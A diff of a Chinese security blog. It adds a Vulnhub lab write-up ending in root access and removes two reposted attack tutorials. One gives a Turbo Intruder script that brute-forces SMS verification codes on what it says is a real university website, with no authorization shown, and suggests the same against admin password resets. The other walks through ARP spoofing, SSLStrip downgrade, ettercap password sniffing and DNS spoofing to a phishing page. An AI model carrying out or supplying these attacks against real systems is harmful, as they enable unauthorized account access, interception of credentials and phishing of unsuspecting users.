+<p><img src="/2023/12/11/WhoWantsToBeKing-1/3.png" alt="image"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现skeylogger文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.121 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/4.png" alt="image"></p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/5.png" alt="image"></p>
+<p>3.最后再进行一下目录扫描，没有什么发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.121 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="文件解密ssh登录">文件解密，SSH登录</span></h3><blockquote>
+<p>1.将skeylogger文件下载到本地，查看文件属性发现是二进制文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file skeylogger</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/7.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -all skeylogger</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/8.png" alt="image"></p>
+<p>2.再利用strings命令看看文件中有没有隐藏什么字符串，发现了一串base编码的字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings skeylogger</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/9.png" alt="image"></p>
+<p>3.将字符串解码，得到dracarys，这个到底是用户名还是密码我们不得而知，于是搜索一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ZHJhY2FyeXMK | base64 -d</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/10.png" alt="image"></p>
+<p>4.从网络查询我们可知，“Dracarys”来自奇幻作品《冰与火之歌》中高等瓦雷利亚语中的“龙焰”，是“龙之母”丹妮莉丝·坦格利安驾驭巨龙之火时使用的口号。靶机开放了22端口，所以很可能用户名是deanerys：</p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/11.png" alt="image"></p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/12.png" alt="image"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.SSH登录后，查看文件权限，有两个程序可以利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/13.png" alt="image"></p>
+<p>2.但在&#x2F;usr&#x2F;lib&#x2F;linuxmint&#x2F;mintUpdate目录下没有那两个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/lib/linuxmint/mintUpdate</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/14.png" alt="image"></p>
+<p>3.回到～目录下，发现在.local&#x2F;share目录下有一个daenerys.zip，解压出来的文件是djkdsnkjdsn，我们查看后提示我们note.txt的文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.local/share</span><br><span class="line">ls -la</span><br><span class="line"></span><br><span class="line">unzip daenerys.zip</span><br><span class="line">cat djkdsnkjdsn</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/15.png" alt="image"></p>
+<p>4.查看note.txt，得到提示，再次网络搜索，得到khaldrogo的全名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/sounds/note.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/16.png" alt="image"></p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/17.png" alt="image"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.khaldrogo就是root用户的密码，登录后在&#x2F;root目录下能够找到flag，即nice.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat nice.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/18.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WhoWantsToBeKing/" rel="tag">WhoWantsToBeKing</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
   
     <article class="post ">
 
@@ -842,327 +1108,6 @@ Newline (0x0a or \n)
     </section>
 </article>
   
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/06/Burpsuite-Turbo-Intruder/">
-                记一次使用Burpsuite下的插件Turbo intruder进行实战
-            </a>
-        </h2>
-    
-    <time>
-        Dec 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="记一次使用burpsuite下的插件turbo-intruder进行实战">记一次使用Burpsuite下的插件Turbo intruder进行实战</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/243953.html">酷酷的繁星</a> 并作补充</p>
-<p>相信很多师傅在进行渗透测试或者漏洞挖掘的时候都会用到burpsuite这款神器，但是不知道师傅们用过burpsuite里面一款叫turbo intruder的插件么</p>
-<p>不管这些，今天看了这篇文章的师傅我相信也会对这款插件有兴趣</p>
-<p>安装教程等等的文章在各大论坛一找一大堆，但是实战的又有几个呢，对吧？</p>
-<p>今天繁星就给大家带来turbo intruder实战教程</p>
-<p>目标站点是某科技大学的站点</p>
-<p>首先我们打开这个站点的首页看看</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/1.png" alt="image"></p>
-<p>可以看到有注册按钮</p>
-<p>我们点进去看看</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/2.png" alt="image"></p>
-<p>然后在这里推荐师傅们一个很便利的短信接收平台</p>
-<p><a target="_blank" rel="noopener" href="https://www.bfkdim.com/">https://www.bfkdim.com/</a></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/3.png" alt="image"></p>
-<p>好的，继续</p>
-<p>手机号那里我们就填这个平台里面的一个手机号</p>
-<p>开启我们的burpsuite，点“立即注册”抓个包</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/4.png" alt="image"></p>
-<p>选择验证码右键</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/5.png" alt="image"></p>
-<p>发送到turbo intruder</p>
-<p>我们这边不同官方的代码</p>
-<p>爆破验证码只需生成数字的所有排列组合就可以了，可以通过以下代码来生成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def brute_veify_code(target, engine, length):</span><br><span class="line">   pattern = &#x27;1234567890&#x27;</span><br><span class="line">   for i in list(product(pattern, repeat=length)):</span><br><span class="line">        code =  &#x27;&#x27;.join(i)</span><br><span class="line">        engine.queue(target.req, code)</span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">   engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">           concurrentConnections=30,</span><br><span class="line">           requestsPerConnection=100,</span><br><span class="line">           pipeline=True</span><br><span class="line">           )</span><br><span class="line">   brute_veify_code(target, engine, 6)</span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, req.wordcount, req.length and req.response</span><br><span class="line"> if &#x27;error&#x27; not in req.response:</span><br><span class="line">      table.add(req)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>复制这段代码替换掉默认的</p>
-<p>然后点击最下方攻击</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/6.png" alt="image"></p>
-<p>我们可以看到各种数据，这速度反正我是爱了，师傅们还没爱吗</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/7.png" alt="image"></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/8.png" alt="image"></p>
-<p>我们可以看到响应包，没有什么限制，所以我们可以继续进行枚举</p>
-<p>PS：拿turbo intruder枚举有时候会崩，不用慌，关掉再来一遍就行了</p>
-<p>由于本人电脑配置太水加上网络慢，所以还没枚举完验证码就过期了，跟我一样的师傅可以尝试多几次</p>
-<p>经过两个小时的奋战后，终于…….</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/9.png" alt="image"></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/10.png" alt="image"></p>
-<p>被ban了</p>
-<p><img src="/11.png" alt="image"></p>
-<p>没有办法只能换个手机号继续搞</p>
-<p>重复做了一遍之后</p>
-<p>当我再点击获取验证码，提示该手机号已经注册，这意味着什么？意味着刚刚的枚举成功了，我们回到turbo intruder找下响应包</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/12.png" alt="image"></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/13.png" alt="image"></p>
-<p>响应包的字节是55，与其它的包不一样所以就是这个了</p>
-<p>可以看到响应包，提示success</p>
-<p>再看看其它的响应包</p>
-<p>这个字节76的是验证码错误</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/14.png" alt="image"></p>
-<p>字节88的是该手机已被注册</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/15.png" alt="image"></p>
-<p>我们会发现前面的全是字节76后面的全88那我们要在76和88的交界部分找成功的包</p>
-<p>另外，再声明一下，这篇文章是介绍turbo intruder的实战，重点在turbo intruder，有的师傅可能会觉得注册处爆破验证码并没什么用，但是大家想想，注册处爆破验证码的原理和找回密码处爆破验证码的原理有什么区别？再大胆点想象一下，要是管理员登录处有找回密码这一功能呢？对吧？</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/06/ARP-SSLStrip/">
-                如何进行一次完整的 SSLStrip 攻击
-            </a>
-        </h2>
-    
-    <time>
-        Dec 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="如何进行一次完整的-sslstrip-攻击">如何进行一次完整的 SSLStrip 攻击</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://glsakura.gitee.io/2020/04/02/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%20SSLStrip%20%E6%94%BB%E5%87%BB/">Glsakura</a> 并作补充</p>
-</blockquote>
-<h2><span id="简介">简介</span></h2><blockquote>
-<p>本文将介绍在局域网内，如何监听受害者流量并通过SSLstrip攻击获取敏感信息，分为如下两步：</p>
-<ol>
-<li>中间人攻击，监听受害者流量</li>
-<li>SSLStrip攻击，获取敏感信息</li>
-</ol>
-</blockquote>
-<h2><span id="实验环境">实验环境</span></h2><blockquote>
-<table>
-<thead>
-<tr>
-<th>IP地址</th>
-<th>MAC地址</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>win10</td>
-<td>192.168.40.1</td>
-<td>00:50:56:C0:00:08</td>
-</tr>
-<tr>
-<td>网关</td>
-<td>192.168.40.2</td>
-<td>00:50:56:E7:9F:31</td>
-</tr>
-<tr>
-<td>kali</td>
-<td>192.168.40.128</td>
-<td>00:0c:29:d8:d4:05</td>
-</tr>
-<tr>
-<td>win7</td>
-<td>192.168.40.130</td>
-<td>00:0C:29:C9:34:A6</td>
-</tr>
-<tr>
-<td>centos7</td>
-<td>192.168.40.132</td>
-<td>00:0c:29:bd:ef:65</td>
-</tr>
-</tbody></table>
-<p>kali：<a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali-images/kali-2020.1b/kali-linux-2020.1b-live-amd64.iso">kali-linux-2020.1b-live-amd64.iso</a></p>
-<p>win7：<a target="_blank" rel="noopener" href="http://d0.ananas.chaoxing.com/download/16169a8dcb8f0e07b98d19c870b10ce3?fn=WIN7lite(x64)">win7</a></p>
-<p>纯净虚拟机系统，使用VMware或者VirtualBox导入镜像即可。<br>采用Win7SP1镜像制作，极限精简，无多余组件，非常纯净，使用流畅，系统已激活。</p>
-</blockquote>
-<h2><span id="中间人攻击">中间人攻击</span></h2><blockquote>
-<p>中间人攻击（<a target="_blank" rel="noopener" href="http://man.linuxde.net/man">man</a>-in-the-Middle Attack, MITM)，就是攻击者扮演中间人进行攻击，可以劫持一段会话，窃取凭证和其他机密信息。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。</p>
-</blockquote>
-<h3><span id="arp-地址解析协议">ARP （地址解析协议）</span></h3><blockquote>
-<p>ARP 协议负责通过 IP 地址找到 MAC 地址（物理地址 ），在以太网中，是利用 MAC 地址来通讯的。</p>
-<p>ARP协议是这样工作的：如win10需要给win7（IP为192.168.40.130)发送数据，为了知道谁是win7，首先win10发送一个广播包给网内所有机器“谁是192.168.40.130”，正常情况其他机器忽略该消息，仅win7回复“我是192.168.40.130”，于是通信就可以开始。所有的主机维护他们自己的ARP缓存表，所以不会每一次都发送广播，ARP表中包含IP对应的MAC地址。</p>
-</blockquote>
-<h4><span id="如何进行arp欺骗">如何进行ARP欺骗?</span></h4><blockquote>
-<p>例如kali需要对win7进行arp欺骗，那他就不再忽略win10发送的消息，他也会大量的发送数据包回复“啊啊啊！我才是192.168.40.130”，然后win10就会错误地建立或者更新了自己ARP表。然后win10发送数据时都发到kali那去了。</p>
-</blockquote>
-<h2><span id="攻击准备">攻击准备</span></h2><h4><span id="mac-下准备">mac 下准备</span></h4><blockquote>
-<ol>
-<li>安装 macports <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=https://www.macports.org/install.php">官网</a></li>
-<li>更新 macports <code>sudo port -d selfupdate</code></li>
-<li>安装 dsniff（包含 arp 攻击的工具）<code>sudo port install dsniff</code></li>
-<li>安装 nmap <code>brew install nmap</code> (如果没有安装 Homebrew，可以去 <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://brew.sh/">Homebrew 官网</a></li>
-</ol>
-</blockquote>
-<h4><span id="linux-下准备">linux 下准备</span></h4><blockquote>
-<ol>
-<li>安装 dsniff <code>apt-get install -y dsniff</code></li>
-<li>安装 nmap <code>apt-get install -y nmap</code></li>
-</ol>
-</blockquote>
-<h2><span id="攻击步骤">攻击步骤</span></h2><h3><span id="寻找目标">寻找目标</span></h3><blockquote>
-<p>使用nmap命令扫描局域网，获得主机列表<br>如果所在局域网路由器地址是 192.168.40.1,可以使用 <code>nmap -sP 192.168.40.1/24</code> 扫描</p>
-<p>-sP 表示使用 ping 方式扫描，192.168.40.1&#x2F;24”表示扫描”192.168.40.1-192.168.40.254”这个网段的所有机器。</p>
-</blockquote>
-<h3><span id="开启-ip-转发">开启 IP 转发</span></h3><blockquote>
-<p>ARP欺骗一般目的是把自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机丢弃（因为本机不是网关，不知道如何处理这类数据包），这会导致没有数据包返回给被欺骗主机，导致断网。这当然是不允许的。开启IP转发功能可以解决该问题。IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法。</p>
-<p>mac 下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.inet.ip.forwarding=1</span><br></pre></td></tr></table></figure>
-
-
-
-<p>linux 下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="arp-欺骗">ARP 欺骗</span></h3><blockquote>
-<p>假设被攻击的 IP 是 192.168.40.130，局域网的网关是 192.168.40.2，攻击电脑使用的网卡接口是 eth0(可以使用 <code>ifconfig</code> 命令查看）, 则欺骗命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br><span class="line"><span class="comment">#arpspoof是dsniff的一个组件，主要用于进行arp欺骗使用</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>成功的的话在被攻击主机上arp表如图所示</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/1.png" alt="image"></p>
-</blockquote>
-<h3><span id="分析数据">分析数据</span></h3><blockquote>
-<p>如果 ARP 欺骗成功，则被攻击的设备会把所有数据先传到我们电脑上，接下来可以使用 ettercap 软件来分析数据。</p>
-</blockquote>
-<h2><span id="使用driftnet获取图片">使用driftnet获取图片</span></h2><blockquote>
-<p>安装driftnet<code>apt-get install driftnet</code></p>
-<p>开始获取<code>driftnet -i eth0</code></p>
-<p>找一个http的网站进行测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:“http” -https</span><br></pre></td></tr></table></figure>
-
-<p>例子：<code>http://www.kan-tv.com/</code></p>
-<p>Tips:https因为进行了加密不能直接获取，进行SSLStrip攻击后就可获取了</p>
-</blockquote>
-<h2><span id="sslstrip-攻击">SSLStrip 攻击</span></h2><blockquote>
-<p>2009年的黑帽大会上，一个名叫Moxie Marlinspike的研究人员,发布了一个叫sslstrip的工具。通过该工具，可以实现对ssl进行中间人攻击。</p>
-<p>SSLstrip 也叫 https 降级攻击，攻击者拦截用户流量后，欺骗用户与攻击者进行 http 通信，攻击者与服务器保持正常通信 （http 或 https），从而获取用户信息。</p>
-</blockquote>
-<h3><span id="攻击原理">攻击原理</span></h3><blockquote>
-<p>攻击者利用用户对于地址栏中HTTPS与HTTP的疏忽，将所有的HTTPS连接都用HTTP来代替。同时，与目标服务器建立正常的HTTPS连接。由于HTTP通信是没有经过加密传输的，并没有HTTPS安全，所以攻击者能轻松实施嗅探。</p>
-<ol>
-<li>通过中间人攻击监听 http 流量</li>
-<li>更改重定向链接中的 location，替换 https 为 http，并记录</li>
-<li>更改响应内容中的超链接，替换 https 为 http，并记录</li>
-<li>与用户进行 http 通信，与服务器进行 https 通信（记录中本应是 https 的请求），从而明文获取用户信息</li>
-</ol>
-<p>Tips:</p>
-<p>当用户浏览的网页中包含https协议，会被转化为http协议的请求</p>
-<p>但是sslstrip也不是万能的， 假如网页中没有https， 但是js代码绑定了跳转到https的协议请求的事件，那么sslstrip就失效了</p>
-</blockquote>
-<h3><span id="攻击准备">攻击准备</span></h3><blockquote>
-<ol>
-<li><p>监听 http 流量</p>
-</li>
-<li><p>获取 <a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip工具</a></p>
-<p>Requirements</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python &gt;= 2.5 (apt-get install python)</span><br><span class="line">The python <span class="string">&quot;twisted-web&quot;</span> module (apt-get install python-twisted-web)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install python python-twisted-web</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/moxie0/sslstrip.git</span><br><span class="line"><span class="built_in">cd</span> sslstrip &amp;&amp; python ./setup.py install</span><br></pre></td></tr></table></figure></li>
-</ol>
-</blockquote>
-<h3><span id="攻击步骤">攻击步骤</span></h3><h4><span id="开启内核转发功能保证攻击过程中被攻击者不断网">开启内核转发功能保证攻击过程中被攻击者不断网</span></h4><blockquote>
-<p>临时ip转发</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
-
-<p>永久ip转发</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1        //修改值</span><br><span class="line">sysctl -p /etc/sysctl.conf    //使修改生效</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4><span id="把流量导入到-sslstrip-程序">把流量导入到 sslstrip 程序</span></h4><blockquote>
-<p>设置iptables以将HTTP通信重定向到sslstrip。<br>输入命令： <code>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</code><br>其中最后面的端口号（比如上面的 10000）就是 sslstrip 程序监听的端口号</p>
-<p>如果攻击完成后要删除这条记录可以输入命令 <code>iptables -t nat -D PREROUTING 1</code></p>
-<p>查看 ip 转发表： <code>iptables -t nat -L</code></p>
-</blockquote>
-<h4><span id="运行arpspoof以说服网络他们应该将流量发送给你">运行arpspoof以说服网络他们应该将流量发送给你</span></h4><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4><span id="启动sslstrip">启动sslstrip</span></h4><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 10000</span><br><span class="line"></span><br><span class="line">-w &lt;文件名&gt;，–write = &lt;文件名&gt;指定要登录的文件（可选）。</span><br><span class="line">-p，–post仅记录SSL POST。（默认）</span><br><span class="line">-s，–ssl记录往返服务器的所有SSL流量。</span><br><span class="line">-a，–all记录往返服务器的所有SSL和HTTP通信。</span><br><span class="line">-l &lt;端口&gt;，–listen = &lt;端口&gt;用于侦听的端口（默认为10000）。</span><br><span class="line">-f，–favicon根据安全请求替换锁图标。</span><br><span class="line">-k，–killsessions终止正在进行的会话。</span><br><span class="line">-h 打印此帮助消息。</span><br><span class="line"></span><br><span class="line">查看端口占用lsof -i tcp:10000</span><br><span class="line"></span><br><span class="line">sslstrip -a -k -f -l 10000</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/ARP-SSLStrip/2.png" alt="image"></p>
-<p>可以看到，网页上没有任何不安全的警告或是提示，只是原先的HTTPS连接已经被HTTP连接所替换，并且为增加迷惑性，网页的图标被修改成了一个银色的锁图案。但是，假的毕竟是假的，一方面无法查看到任何证书的信息，另外如果在网址前输入https:&#x2F;&#x2F;，则网页无法发开。因此，sslstrip并不是万能的攻击方法。</p>
-</blockquote>
-<h3><span id="使用ettercap对目标主机进行arp攻击并且开始嗅探密码">使用ettercap对目标主机进行arp攻击，并且开始嗅探密码</span></h3><blockquote>
-<p>终端界面嗅探密码<code>ettercap -Tq -i eth0</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-P  使用插件</span><br><span class="line">-T  使用基于文本界面</span><br><span class="line">-q  启动安静模式（不回显）</span><br><span class="line">-M  启动ARP欺骗攻击</span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们使用ettercap的GTK+ GUI图像界面<code>ettercap -G</code></p>
-<p><img src="/2023/12/06/ARP-SSLStrip/3.png" alt="image"></p>
-<p>选择Sniff—-Unified-sniffing，然后选择网卡：eth0(我这里是eth0，大家根据情况选择)。</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/4.png" alt="image"></p>
-<p>然后Hosts——Scan for hosts——Hosts list</p>
-<p>我们的目标主机ip(192.168.40.130)选定目标主机，然后点add to target 1，将目标主机添加到目标；选定路由，点add to target 2，将路由添加到目标2</p>
-<p>添加成功后，点击Mitm——ARP posoning ，勾选sniff remote connections。</p>
-<p>之后start——start sniffing开始监听。</p>
-<p>点击view——connections查看被攻击机访问的IP，端口，协议，发送和接收的数据包大小。</p>
-<p>点击view——profiles查看被攻击机访问的链接。在下方可以查看更清晰的链接访问情况。</p>
-<p>当然你也可以通过双击链接来查看profiles details，即访问网站的具体情况。</p>
-<p>在这里，如果被攻击机输入密码登陆某一网站，我们可以检测到登陆的用户名及其密码。</p>
-<p>这是刚刚检测到的一个用户名和登陆密码。这个网站完全没有对密码进行加密操作，出来的结果也是明文显示的。</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/5.png" alt="image"></p>
-<p>这是另外一个站检测出来的，对密码进行了加密。</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/6.png" alt="image"></p>
-<p>Tips：其实一个网站如果使用的都是https协议，那么安全性一般做的比较好，数据进行了加密的，也就是说你即使已经把https降低为http，即使捕获到了密码，你也不可能轻易解密的出来。</p>
-</blockquote>
-<h4><span id="测试网址">测试网址</span></h4><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.freemojo.com</span><br><span class="line">//http密码明文未加密</span><br><span class="line">http://bbs.ylnet.com.cn/forum.php</span><br><span class="line">//http密码加密了</span><br><span class="line">http://www.discuz.net/forum.php</span><br><span class="line">//https密码未加密</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="dns欺骗">DNS欺骗</span></h3><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
-
-<p>在微软处添加：</p>
-<p>&#96;<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> A 192.168.40.132</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/7.png" alt="image"></p>
-<p>ettercap -G（进入图形界面）</p>
-<p>重复之前的步骤ARP欺骗的步骤，在start sniffing之前添加一个插件</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/8.png" alt="image"></p>
-<p>双击启动dns_spoof</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/9.png" alt="image"></p>
-<p>开始嗅探后，我们在目标机中ping一下百度</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/10.png" alt="image"></p>
-<p>欺骗成功，如果将192.168.40.132改为钓鱼页面，就可以欺骗到用户账号密码</p>
-<p><img src="/2023/12/06/ARP-SSLStrip/11.png" alt="image"></p>
-<p>最后提醒大家，连接公共wifi时一定要小心！</p>
-</blockquote>
-<h2><span id="参考资料">参考资料</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/983d43b4ba1e">如何进行一次完整的 SSLStrip</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/paperpen/p/10810690.html">ARP欺骗之ettercap图形化界面</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bbf50dace855">APR攻击（Arpspoof）</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li_101357/article/details/78416813">linux ip 转发设置 ip_forward、ip_forward与路由转发</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79070945">HTTP&amp;HTTPS账号密码获取与ettercap局域网内DNS欺骗</a></p>
